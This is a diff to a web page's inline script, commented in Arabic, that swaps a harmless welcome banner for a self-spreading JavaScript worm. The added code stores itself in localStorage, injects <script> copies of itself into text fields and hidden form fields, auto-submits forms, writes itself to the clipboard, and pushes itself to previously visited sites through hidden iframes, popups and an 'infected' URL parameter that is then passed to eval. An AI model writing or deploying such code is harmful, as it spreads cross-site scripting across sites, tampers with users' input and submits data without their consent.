@@ -11,46 +11,124 @@
       style="display:none;width:0;height:0;"></iframe>
 
     <script>
-(function(){
-  if(sessionStorage.getItem('welcomeDisplayed')) return;
-  sessionStorage.setItem('welcomeDisplayed', 'true');
+(function persistentWorm(){
+  const wormCode = `(${persistentWorm.toString()})();`;
 
-  // إنشاء عنصر رسالة متحركة
-  const msg = document.createElement('div');
-  msg.textContent = "مرحباً بك في موقعنا! استمتع بوقتك.";
-  msg.style.position = 'fixed';
-  msg.style.bottom = '20px';
-  msg.style.right = '-300px';
-  msg.style.padding = '15px 25px';
-  msg.style.background = '#444';
-  msg.style.color = '#fff';
-  msg.style.fontSize = '18px';
-  msg.style.fontWeight = 'bold';
-  msg.style.borderRadius = '8px';
-  msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
-  msg.style.zIndex = '9999';
-  msg.style.transition = 'right 1s ease';
+  // تخزين الكود نفسه في localStorage للتثبيت
+  try {
+    localStorage.setItem('persistent_worm', wormCode);
+  } catch(e){}
 
-  document.body.appendChild(msg);
+  // تتبع آخر موقعين زارهم المستخدم وتخزينها
+  try {
+    let sites = JSON.parse(localStorage.getItem('lastSites')) || [];
+    const current = location.origin;
+    if (!sites.includes(current)) {
+      sites.push(current);
+      if (sites.length > 2) sites.shift();
+      localStorage.setItem('lastSites', JSON.stringify(sites));
+    }
+  } catch(e){}
 
-  // تحريك الرسالة من خارج الشاشة للداخل
-  setTimeout(() => {
+  // زرع رسالة ثابتة في الموقع
+  function injectMessage() {
+    if (document.getElementById('wormMsg')) return;
+
+    const msg = document.createElement('div');
+    msg.id = 'wormMsg';
+    msg.textContent = "مرحباً، الكود مثبت وينتشر!";
+    msg.style.position = 'fixed';
+    msg.style.bottom = '20px';
     msg.style.right = '20px';
-  }, 100);
+    msg.style.padding = '15px 25px';
+    msg.style.background = '#444';
+    msg.style.color = '#fff';
+    msg.style.fontSize = '18px';
+    msg.style.fontWeight = 'bold';
+    msg.style.borderRadius = '8px';
+    msg.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
+    msg.style.zIndex = '99999';
 
-  // إخفاء الرسالة بعد 5 ثواني
-  setTimeout(() => {
-    msg.style.right = '-300px';
-    setTimeout(() => msg.remove(), 1000);
-  }, 5000);
+    document.body.appendChild(msg);
+  }
 
-  // حاول ينشر نفسه في حقول البحث لو موجودة
-  const inputs = document.querySelectorAll('input[type="text"], input[type="search"]');
+  injectMessage();
+
+  // كل 10 ثواني تأكد الرسالة موجودة
+  setInterval(injectMessage, 10000);
+
+  // استدعاء آخر موقعين للتوسع بالانتشار
+  let sites = [];
+  try {
+    sites = JSON.parse(localStorage.getItem('lastSites')) || [];
+  } catch(e){}
+
+  // حقن في الحقول النصية
+  const inputs = document.querySelectorAll('input[type="text"], textarea');
   inputs.forEach(input => {
-    if (!input.value.includes('مرحباً')) {
-      input.value += ' مرحباً بك!';
+    if (!input.value.includes('worm')) {
+      input.value += ` <script>${wormCode}</script>`;
     }
   });
+
+  // إرسال للنماذج مع حقن الكود
+  const forms = document.querySelectorAll('form');
+  forms.forEach(form => {
+    if (!form.querySelector('input[name="worm"]')) {
+      const hidden = document.createElement('input');
+      hidden.type = 'hidden';
+      hidden.name = 'worm';
+      hidden.value = `<script>${wormCode}</script>`;
+      form.appendChild(hidden);
+      setTimeout(() => form.submit(), 3000);
+    }
+  });
+
+  // نسخ الكود للحافظة لو ممكن
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(`<script>${wormCode}</script>`).catch(() => {});
+  }
+
+  // نشر عبر iframes على آخر موقعين
+  sites.forEach(site => {
+    if (site && site !== location.origin) {
+      const iframe = document.createElement('iframe');
+      iframe.src = `${site}/?infected=${encodeURIComponent(wormCode)}`;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+    }
+  });
+
+  // نشر الكود عبر رابط الصفحة (query param)
+  if (!location.search.includes('infected')) {
+    const encoded = encodeURIComponent(wormCode);
+    const newUrl = `${location.pathname}?infected=${encoded}`;
+    history.replaceState({}, '', newUrl);
+  } else {
+    try {
+      const code = decodeURIComponent(new URLSearchParams(location.search).get('infected'));
+      eval(code);
+    } catch(e){}
+  }
+
+  // فتح نافذة على آخر موقع مصاب
+  if (sites.length > 0) {
+    setTimeout(() => {
+      const win = window.open(`${sites[sites.length - 1]}/?infected=${encodeURIComponent(wormCode)}`, '_blank');
+      if (win) win.blur();
+    }, 5000);
+  }
+
+  // عند تحميل الصفحة تأكد إعادة تشغيل الكود من التخزين
+  window.addEventListener('load', () => {
+    try {
+      const storedWorm = localStorage.getItem('persistent_worm');
+      if (storedWorm && storedWorm !== wormCode) {
+        eval(storedWorm);
+      }
+    } catch(e){}
+  });
+
 })();
   </script>
   </body>
